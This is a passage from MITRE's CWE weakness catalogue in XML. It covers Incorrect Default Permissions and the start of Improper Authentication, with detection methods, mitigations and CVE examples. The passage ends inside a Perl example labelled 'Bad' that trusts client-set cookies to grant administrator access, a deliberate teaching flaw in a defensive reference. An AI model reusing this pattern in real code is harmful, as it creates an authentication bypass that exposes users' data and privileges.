               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Description, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Causal_Nature, Modes_of_Introduction, Relationships, Type</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Maintenance_Notes, Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Detection_Factors, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Contribution Type="Content">
				  <Contribution_Name>"Mapping CWE to 62443" Sub-Working Group</Contribution_Name>
				  <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
				  <Contribution_Date>2023-06-29</Contribution_Date>
				  <Contribution_Version>4.12</Contribution_Version>
				  <Contribution_ReleaseDate>2023-06-29</Contribution_ReleaseDate>
				  <Contribution_Comment>Suggested mappings to ISA/IEC 62443.</Contribution_Comment>
				</Contribution>
            <Previous_Entry_Name Date="2008-09-09">Privilege Management Error</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Insecure Privilege Management</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="276" Name="Incorrect Default Permissions" Abstraction="Base" Structure="Simple" Status="Draft">
     <Description>During installation, installed file permissions are set to allow anyone to modify those files.</Description>
     <Related_Weaknesses>
      <Related_Weakness Nature="ChildOf" CWE_ID="732" View_ID="1000" Ordinal="Primary"/>
      <Related_Weakness Nature="ChildOf" CWE_ID="732" View_ID="1003" Ordinal="Primary"/>
     </Related_Weaknesses>
     <Weakness_Ordinalities>
      <Weakness_Ordinality>
        <Ordinality>Primary</Ordinality>
      </Weakness_Ordinality>
     </Weakness_Ordinalities>
     <Applicable_Platforms>
      <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
      <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
	  <Technology Class="ICS/OT" Prevalence="Undetermined"/>
     </Applicable_Platforms>
     <Modes_Of_Introduction>
      <Introduction>
        <Phase>Architecture and Design</Phase>
      </Introduction>
      <Introduction>
        <Phase>Implementation</Phase>
      </Introduction>
      <Introduction>
        <Phase>Installation</Phase>
      </Introduction>
      <Introduction>
        <Phase>Operation</Phase>
      </Introduction>
     </Modes_Of_Introduction>
     <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
     <Common_Consequences>
      <Consequence>
        <Scope>Confidentiality</Scope>
        <Scope>Integrity</Scope>
        <Impact>Read Application Data</Impact>
        <Impact>Modify Application Data</Impact>
      </Consequence>
     </Common_Consequences>
     <Detection_Methods>
      <Detection_Method>
        <Method>Automated Static Analysis - Binary or Bytecode</Method>
        <Description>
         <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
         <xhtml:div style="margin-left:1em;">
           <xhtml:div>Cost effective for partial coverage:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Inter-application Flow Analysis</xhtml:li>
            </xhtml:ul>
         </xhtml:div>
        </Description>
        <Effectiveness>SOAR Partial</Effectiveness>
      </Detection_Method>
      <Detection_Method>
        <Method>Manual Static Analysis - Binary or Bytecode</Method>
        <Description>
         <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
         <xhtml:div style="margin-left:1em;">
           <xhtml:div>Cost effective for partial coverage:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
            </xhtml:ul>
         </xhtml:div>
        </Description>
        <Effectiveness>SOAR Partial</Effectiveness>
      </Detection_Method>
      <Detection_Method>
        <Method>Dynamic Analysis with Automated Results Interpretation</Method>
        <Description>
         <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
         <xhtml:div style="margin-left:1em;">
           <xhtml:div>Cost effective for partial coverage:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Host-based Vulnerability Scanners - Examine configuration for flaws, verifying that audit mechanisms work, ensure host configuration meets certain predefined criteria</xhtml:li>
              <xhtml:li>Web Application Scanner</xhtml:li>
              <xhtml:li>Web Services Scanner</xhtml:li>
              <xhtml:li>Database Scanners</xhtml:li>
            </xhtml:ul>
         </xhtml:div>
        </Description>
        <Effectiveness>SOAR Partial</Effectiveness>
      </Detection_Method>
      <Detection_Method>
        <Method>Dynamic Analysis with Manual Results Interpretation</Method>
        <Description>
         <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
         <xhtml:div style="margin-left:1em;">
           <xhtml:div>Highly cost effective:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Host Application Interface Scanner</xhtml:li>
            </xhtml:ul>
           <xhtml:div>Cost effective for partial coverage:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Fuzz Tester</xhtml:li>
              <xhtml:li>Framework-based Fuzzer</xhtml:li>
              <xhtml:li>Automated Monitored Execution</xhtml:li>
              <xhtml:li>Forced Path Execution</xhtml:li>
            </xhtml:ul>
         </xhtml:div>
        </Description>
        <Effectiveness>High</Effectiveness>
      </Detection_Method>
      <Detection_Method>
        <Method>Manual Static Analysis - Source Code</Method>
        <Description>
         <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
         <xhtml:div style="margin-left:1em;">
           <xhtml:div>Highly cost effective:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
            </xhtml:ul>
           <xhtml:div>Cost effective for partial coverage:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
            </xhtml:ul>
         </xhtml:div>
        </Description>
        <Effectiveness>High</Effectiveness>
      </Detection_Method>
      <Detection_Method>
        <Method>Automated Static Analysis - Source Code</Method>
        <Description>
         <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
         <xhtml:div style="margin-left:1em;">
           <xhtml:div>Cost effective for partial coverage:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
            </xhtml:ul>
         </xhtml:div>
        </Description>
        <Effectiveness>SOAR Partial</Effectiveness>
      </Detection_Method>
      <Detection_Method>
        <Method>Automated Static Analysis</Method>
        <Description>
         <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
         <xhtml:div style="margin-left:1em;">
           <xhtml:div>Cost effective for partial coverage:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Configuration Checker</xhtml:li>
            </xhtml:ul>
         </xhtml:div>
        </Description>
        <Effectiveness>SOAR Partial</Effectiveness>
      </Detection_Method>
      <Detection_Method>
        <Method>Architecture or Design Review</Method>
        <Description>
         <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
         <xhtml:div style="margin-left:1em;">
           <xhtml:div>Highly cost effective:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
            </xhtml:ul>
           <xhtml:div>Cost effective for partial coverage:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
            </xhtml:ul>
         </xhtml:div>
        </Description>
        <Effectiveness>High</Effectiveness>
      </Detection_Method>
     </Detection_Methods>
     <Potential_Mitigations>
      <Mitigation Mitigation_ID="MIT-1">
        <Phase>Architecture and Design</Phase>
        <Phase>Operation</Phase>
        <Description>The architecture needs to access and modification attributes for files to only those users who actually require those actions.</Description>
      </Mitigation>
      <Mitigation Mitigation_ID="MIT-46">
        <Phase>Architecture and Design</Phase>
        <Strategy>Separation of Privilege</Strategy>
        <Description>
          <xhtml:p>Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.</xhtml:p>
          <xhtml:p>Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.</xhtml:p>
        </Description>
      </Mitigation>
     </Potential_Mitigations>
     <Observed_Examples>
      <Observed_Example>
        <Reference>CVE-2005-1941</Reference>
        <Description>Executables installed world-writable.</Description>
        <Link>https://www.cve.org/CVERecord?id=CVE-2005-1941</Link>
      </Observed_Example>
      <Observed_Example>
        <Reference>CVE-2002-1713</Reference>
        <Description>Home directories installed world-readable.</Description>
        <Link>https://www.cve.org/CVERecord?id=CVE-2002-1713</Link>
      </Observed_Example>
      <Observed_Example>
        <Reference>CVE-2001-1550</Reference>
        <Description>World-writable log files allow information loss; world-readable file has cleartext passwords.</Description>
        <Link>https://www.cve.org/CVERecord?id=CVE-2001-1550</Link>
      </Observed_Example>
      <Observed_Example>
        <Reference>CVE-2002-1711</Reference>
        <Description>World-readable directory.</Description>
        <Link>https://www.cve.org/CVERecord?id=CVE-2002-1711</Link>
      </Observed_Example>
      <Observed_Example>
        <Reference>CVE-2002-1844</Reference>
        <Description>Windows product uses insecure permissions when installing on Solaris (genesis: port error).</Description>
        <Link>https://www.cve.org/CVERecord?id=CVE-2002-1844</Link>
      </Observed_Example>
      <Observed_Example>
        <Reference>CVE-2001-0497</Reference>
        <Description>Insecure permissions for a shared secret key file. Overlaps cryptographic problem.</Description>
        <Link>https://www.cve.org/CVERecord?id=CVE-2001-0497</Link>
      </Observed_Example>
      <Observed_Example>
        <Reference>CVE-1999-0426</Reference>
        <Description>Default permissions of a device allow IP spoofing.</Description>
        <Link>https://www.cve.org/CVERecord?id=CVE-1999-0426</Link>
      </Observed_Example>
     </Observed_Examples>
     <Taxonomy_Mappings>
      <Taxonomy_Mapping Taxonomy_Name="PLOVER">
        <Entry_Name>Insecure Default Permissions</Entry_Name>
      </Taxonomy_Mapping>
      <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
        <Entry_ID>FIO06-C</Entry_ID>
        <Entry_Name>Create files with appropriate access permissions</Entry_Name>
      </Taxonomy_Mapping>
      <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
        <Entry_ID>FIO01-J</Entry_ID>
        <Entry_Name>Create files with appropriate access permission</Entry_Name>
      </Taxonomy_Mapping>
      <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	<Entry_ID>Part 2-4</Entry_ID>
	<Entry_Name>Req SP.03.08</Entry_Name>
      </Taxonomy_Mapping>
      <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	<Entry_ID>Part 4-2</Entry_ID>
	<Entry_Name>Req CR 2.1</Entry_Name>
      </Taxonomy_Mapping>
     </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="1"/>
            <Related_Attack_Pattern CAPEC_ID="127"/>
            <Related_Attack_Pattern CAPEC_ID="81"/>
         </Related_Attack_Patterns>
         <References>
      <Reference External_Reference_ID="REF-62" Section="Chapter 3, &#34;Insecure Defaults&#34;, Page 69"/>
     </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
     <Content_History>
      <Submission>
        <Submission_Name>PLOVER</Submission_Name>
        <Submission_Date>2006-07-19</Submission_Date>
        <Submission_Version>Draft 3</Submission_Version>
        <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
      </Submission>
      <Modification>
        <Modification_Name>Eric Dalci</Modification_Name>
        <Modification_Organization>Cigital</Modification_Organization>
        <Modification_Date>2008-07-01</Modification_Date>
        <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2008-09-08</Modification_Date>
        <Modification_Comment>updated Relationships, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2008-11-24</Modification_Date>
        <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2009-05-27</Modification_Date>
        <Modification_Comment>updated Description, Name</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2011-06-01</Modification_Date>
        <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2011-09-13</Modification_Date>
        <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2012-05-11</Modification_Date>
        <Modification_Comment>updated References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2012-10-30</Modification_Date>
        <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2014-07-30</Modification_Date>
        <Modification_Comment>updated Detection_Factors, Relationships</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2017-05-03</Modification_Date>
        <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2017-11-08</Modification_Date>
        <Modification_Comment>updated Applicable_Platforms, Causal_Nature, Modes_of_Introduction, Relationships, Taxonomy_Mappings</Modification_Comment>
      </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Description, Detection_Factors, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Description, Modes_of_Introduction, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>"Mapping CWE to 62443" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-04-25</Contribution_Date>
               <Contribution_Comment>Suggested mappings to ISA/IEC 62443.</Contribution_Comment>
            </Contribution>
      <Previous_Entry_Name Date="2009-05-27">Insecure Default Permissions</Previous_Entry_Name>
     </Content_History>
   </Weakness>
      <Weakness ID="287" Name="Improper Authentication" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>When an actor claims to have a given identity, the product does not prove or insufficiently proves that the claim is correct.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1000" Ordinal="Primary"/>
			<Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1340" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="ICS/OT" Prevalence="Often"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>authentification</Term>
               <Description>An alternate term is "authentification", which appears to be most commonly used by people from non-English-speaking countries.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>AuthN</Term>
               <Description>"AuthN" is typically used as an abbreviation of "authentication" within the web application security community. It is also distinct from "AuthZ," which is an abbreviation of "authorization." The use of "Auth" as an abbreviation is discouraged, since it could be used for either authentication or authorization.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>AuthC</Term>
               <Description>"AuthC" is used as an abbreviation of "authentication," but it appears to used less frequently than "AuthN."</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Scope>Access Control</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>This weakness can lead to the exposure of resources or functionality to unintended actors, possibly providing attackers with sensitive information or even execute arbitrary code.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-6">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>Automated static analysis is useful for detecting certain types of authentication. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authentication libraries.</xhtml:p>
                  <xhtml:p>Generally, automated static analysis tools have difficulty detecting custom authentication schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an established identity; an automated technique that detects the absence of authentication may report false positives.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-7">
               <Method>Manual Static Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</xhtml:p>
                  <xhtml:p>Manual static analysis is useful for evaluating the correctness of custom authentication mechanisms.</xhtml:p>
               </Description>
               <Effectiveness>High</Effectiveness>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Configuration Checker</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>Use an authentication framework or library such as the OWASP ESAPI Authentication feature.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code intends to ensure that the user is already logged in. If not, the code performs authentication with the user-provided username and password. If successful, it sets the loggedin and user cookies to "remember" that the user has already logged in. Finally, the code performs administrator tasks if the logged-in user has the "Administrator" username, as recorded in the user cookie.</Intro_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div>my $q = new CGI;<xhtml:br/>
                     <xhtml:br/>if ($q-&gt;cookie('loggedin') ne "true") {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>if (! AuthenticateUser($q-&gt;param('username'), $q-&gt;param('password'))) {<xhtml:div style="margin-left:1em;">ExitError("Error: you need to log in first");</xhtml:div>}<xhtml:br/>else {<xhtml:div style="margin-left:1em;">
                              <xhtml:div># Set loggedin and user cookies.<xhtml:br/>$q-&gt;cookie(<xhtml:div style="margin-left:1em;">-name =&gt; 'loggedin',<xhtml:br/>-value =&gt; 'true'<xhtml:br/>);</xhtml:div>
                                 <xhtml:br/>$q-&gt;cookie(<xhtml:div style="margin-left:1em;">-name =&gt; 'user',<xhtml:br/>-value =&gt; $q-&gt;param('username')<xhtml:br/>);</xhtml:div>
                              </xhtml:div>
                           </xhtml:div>}</xhtml:div>
                     </xhtml:div>}<xhtml:br/>
